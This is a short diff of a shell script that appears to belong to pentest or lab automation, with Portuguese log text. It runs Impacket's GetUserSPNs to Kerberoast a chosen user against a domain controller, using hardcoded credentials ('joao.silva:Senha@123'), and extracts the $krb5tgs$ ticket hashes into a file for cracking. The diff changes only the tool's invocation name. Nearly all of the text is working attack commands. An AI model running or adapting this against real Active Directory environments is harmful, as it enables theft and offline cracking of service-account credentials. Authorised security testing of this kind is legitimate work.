@@ -9,7 +9,7 @@ mkdir -p "$OUT"
 
 LOG="$OUT/02-kerberoast.log"
 echo "[*] Impacket Kerberoast para ${USER}@${DOMAIN}" | tee "$LOG"
-GetUserSPNs.py "${DOMAIN}/joao.silva:Senha@123" -dc-ip "$DC_IP" \
+impacket-GetUserSPNs "${DOMAIN}/joao.silva:Senha@123" -dc-ip "$DC_IP" \
     -request-user "$USER" -request 2>&1 | tee -a "$LOG" || true
 
 grep -oE '\$krb5tgs\$[^[:space:]]+' "$LOG" > "$OUT/kerberoast.hash" || true
